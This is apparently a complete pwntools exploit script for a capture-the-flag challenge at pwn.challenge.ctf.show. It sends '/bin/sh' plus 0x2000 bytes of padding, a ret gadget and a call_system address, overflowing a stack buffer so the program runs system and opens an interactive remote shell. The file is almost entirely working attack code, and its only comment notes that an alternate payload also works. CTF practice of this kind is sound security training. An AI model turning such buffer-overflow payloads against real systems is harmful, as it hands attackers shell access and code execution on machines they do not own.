from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28290)
call_system = 0x400672
ret = 0x400526 # 0x0000000000400526 : ret
payload = "/bin/sh\x00" + 'A'*(0x2000 - 8) + p64(ret) + p64(call_system)
#payload = "/bin/sh\x00" + 'A'*(0x2000) + p64(call_system)    # 两种写法都可以 
io.sendline(payload)
io.recv()
io.interactive()
